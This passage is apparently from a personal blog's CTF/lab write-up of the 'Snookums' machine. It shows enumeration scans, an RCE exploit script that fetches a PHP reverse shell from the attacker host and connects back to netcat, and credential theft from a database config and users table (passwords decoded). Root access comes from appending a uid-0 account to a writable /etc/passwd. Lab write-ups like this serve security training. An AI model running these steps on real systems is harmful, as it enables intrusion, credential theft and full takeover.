+</span></span><span class="line"><span class="cl">~/snook/test.html does not exist                                                                                      
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put ~/snook/test.html                                                                                         
+</span></span><span class="line"><span class="cl">~/snook/test.html does not exist                                                                                      
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put ~/snook/test.html test.html                                                                               
+</span></span><span class="line"><span class="cl">~/snook/test.html does not exist                                                                                      
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put test.html test.html
+</span></span><span class="line"><span class="cl">NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file <span class="se">\t</span>est.html
+</span></span></code></pre></div><h2 id="mysql">MySQL</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mysql -h 192.168.239.58
+</span></span><span class="line"><span class="cl">ERROR <span class="m">1130</span> <span class="o">(</span>HY000<span class="o">)</span>: Host <span class="s1">&#39;192.168.45.240&#39;</span> is not allowed to connect to this MySQL server
+</span></span></code></pre></div><h2 id="http">HTTP</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# gobuster dir -u http://192.168.239.58/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.5
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://192.168.239.58/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.5
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/10/18 17:50:36 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.239.58/css/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 233<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.239.58/js/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.239.58/images/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/photos               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.239.58/photos/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">23992</span> / <span class="m">30001</span> <span class="o">(</span>79.97%<span class="o">)[</span>ERROR<span class="o">]</span> 2023/10/18 17:52:27 <span class="o">[</span>!<span class="o">]</span> parse <span class="s2">&#34;http://192.168.239.58/error\x1f_log&#34;</span>: net/url: invalid control character in URL
+</span></span><span class="line"><span class="cl">Progress: <span class="m">29985</span> / <span class="m">30001</span> <span class="o">(</span>99.95%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/10/18 17:52:55 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nikto -host 192.168.239.58 -port <span class="m">80</span>                                                                                  <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          192.168.239.58
+</span></span><span class="line"><span class="cl">+ Target Hostname:    192.168.239.58
+</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">80</span>
+</span></span><span class="line"><span class="cl">+ Start Time:         2023-10-18 17:48:33 <span class="o">(</span>GMT3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+</span></span><span class="line"><span class="cl">+ Retrieved x-powered-by header: PHP/5.4.16
+</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span></span><span class="line"><span class="cl">+ Apache/2.4.6 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span>. Apache 2.2.34 is the EOL <span class="k">for</span> the 2.x branch.
+</span></span><span class="line"><span class="cl">+ PHP/5.4.16 appears to be outdated <span class="o">(</span>current is at least 7.2.12<span class="o">)</span>. PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release <span class="k">for</span> each branch.
+</span></span><span class="line"><span class="cl">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false</span> positives.
+</span></span><span class="line"><span class="cl">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+</span></span><span class="line"><span class="cl">+ OSVDB-12184: /?<span class="o">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span></span><span class="line"><span class="cl">+ OSVDB-12184: /?<span class="o">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span></span><span class="line"><span class="cl">+ OSVDB-12184: /?<span class="o">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /css/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /css/: This might be interesting...
+</span></span><span class="line"><span class="cl">+ OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /icons/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /images/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3233: /icons/README: Apache default file found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /license.txt: License file found may identify site software.
+</span></span><span class="line"><span class="cl">+ <span class="m">8724</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">18</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+</span></span><span class="line"><span class="cl">+ End Time:           2023-10-18 17:56:30 <span class="o">(</span>GMT3<span class="o">)</span> <span class="o">(</span><span class="m">477</span> seconds<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
+</span></span></code></pre></div><h1 id="exploit">Exploit</h1>
+<h3 id="payload">Payload</h3>
+<p>It appears that this application is vulnerable against remote code execution.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://192.168.239.58/image.php?img<span class="o">=</span>
+</span></span></code></pre></div><p><a href="https://github.com/beauknowstech/SimplePHPGal-RCE.py">https://github.com/beauknowstech/SimplePHPGal-RCE.py</a></p>
+<p>I found interesting python script on Github.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook/SimplePHPGal-RCE.py<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 SimplePHPGal-RCE.py http://192.168.239.58 192.168.45.240 <span class="m">21</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>✔<span class="o">]</span> Serving HTTP traffic from /root/snook/SimplePHPGal-RCE.py on 192.168.45.240 using port <span class="m">80</span> in background
+</span></span><span class="line"><span class="cl">Run <span class="s1">&#39;nc -nlvp 21&#39;</span> on attacker machine in another terminal. Then press any key to <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">Attempting to reach reverse shell on 192.168.45.240 on port <span class="m">80</span>
+</span></span><span class="line"><span class="cl">192.168.239.58 - - <span class="o">[</span>18/Oct/2023 18:32:37<span class="o">]</span> <span class="s2">&#34;GET /rev.php HTTP/1.0&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl">Request sent. Check your nc <span class="k">for</span> a connection
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# rlwrap nc -lvnp <span class="m">21</span>                                                                                                   <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.240<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.239.58<span class="o">]</span> <span class="m">59708</span>
+</span></span><span class="line"><span class="cl">SOCKET: Shell has connected! PID: <span class="m">4380</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">README.txt
+</span></span><span class="line"><span class="cl">UpgradeInstructions.txt
+</span></span><span class="line"><span class="cl">css
+</span></span><span class="line"><span class="cl">db.php
+</span></span><span class="line"><span class="cl">embeddedGallery.php
+</span></span><span class="line"><span class="cl">functions.php
+</span></span><span class="line"><span class="cl">image.php
+</span></span><span class="line"><span class="cl">images
+</span></span><span class="line"><span class="cl">index.php
+</span></span><span class="line"><span class="cl">js
+</span></span><span class="line"><span class="cl">license.txt
+</span></span><span class="line"><span class="cl">photos
+</span></span><span class="line"><span class="cl">phpGalleryConfig.php
+</span></span><span class="line"><span class="cl">phpGalleryStyle-RED.css
+</span></span><span class="line"><span class="cl">phpGalleryStyle.css
+</span></span><span class="line"><span class="cl">phpGallery_images
+</span></span><span class="line"><span class="cl">phpGallery_thumbs
+</span></span><span class="line"><span class="cl">thumbnail_generator.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">apache
+</span></span></code></pre></div><p>I run the script and waited for the connection using netcat, and then I got the shell.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.2$ <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/var/www/html
+</span></span><span class="line"><span class="cl">bash-4.2$ cat db.php
+</span></span><span class="line"><span class="cl">cat db.php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DBHOST&#39;</span>, <span class="s1">&#39;127.0.0.1&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DBUSER&#39;</span>, <span class="s1">&#39;root&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DBPASS&#39;</span>, <span class="s1">&#39;MalapropDoffUtilize1337&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DBNAME&#39;</span>, <span class="s1">&#39;SimplePHPGal&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-4.2$ mysql -u root -p
+</span></span><span class="line"><span class="cl">mysql -u root -p
+</span></span><span class="line"><span class="cl">Enter password: MalapropDoffUtilize1337
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; use SimplePHPGal
+</span></span><span class="line"><span class="cl">use SimplePHPGal
+</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">mysql&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_SimplePHPGal <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from users<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from users<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+----------+----------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> username <span class="p">|</span> password                                     <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------+----------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> josh     <span class="p">|</span> <span class="nv">VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0</span><span class="o">=</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> michael  <span class="p">|</span> <span class="nv">U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ</span><span class="o">==</span>     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> serena   <span class="p">|</span> <span class="nv">VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ</span><span class="o">==</span>     <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------+----------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s1">&#39;U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==&#39;</span> <span class="p">|</span> base64 --decode <span class="p">|</span> base64 --decode
+</span></span><span class="line"><span class="cl">HockSydneyCertify123
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/snook<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh michael@192.168.239.58                                                                                         <span class="m">126</span> ⨯
+</span></span><span class="line"><span class="cl">michael@192.168.239.58<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Last login: Wed Oct <span class="m">18</span> 12:09:34 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>michael@snookums ~<span class="o">]</span>$ 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>michael@snookums ~<span class="o">]</span>$ ls
+</span></span><span class="line"><span class="cl">local.txt
+</span></span></code></pre></div><p>I got michael’s shell.</p>
+<h2 id="root-shell">Root Shell</h2>
+<p><img src="snookums%20d2e709fcc8c44a989ed6778cc9de179d/Screenshot_2023-10-18_at_19.29.39.png" alt="Screenshot 2023-10-18 at 19.29.39.png"></p>
+<p>/etc/paswd is writable. This is bad.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root@snookums ~<span class="o">]</span><span class="c1"># openssl passwd hello</span>
+</span></span><span class="line"><span class="cl">4eDdB38csmWpI
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@snookums ~<span class="o">]</span><span class="c1"># echo &#39;sasuke:4eDdB38csmWpI:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwdI switched the user “sasuke” with password hello, and I got the shell.</span>
+</span></span></code></pre></div><p><img src="snookums%20d2e709fcc8c44a989ed6778cc9de179d/Screenshot_2023-10-18_at_19.27.43.png" alt="Screenshot 2023-10-18 at 19.27.43.png"></p>
+<p>I switched the user “sasuke” with password hello, and I got the shell.</p>
+<h1 id="summary">Summary</h1>
+<p>After almost giving up trying to get the shell using the discovered script because it specified port 4444 for the attacker, I finally succeeded by changing it to port 21. When implementing reverse shell, it&rsquo;s important to reuse the port number that&rsquo;s open on the target machine from the attacker&rsquo;s machine, as it&rsquo;s less likely to be blocked.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
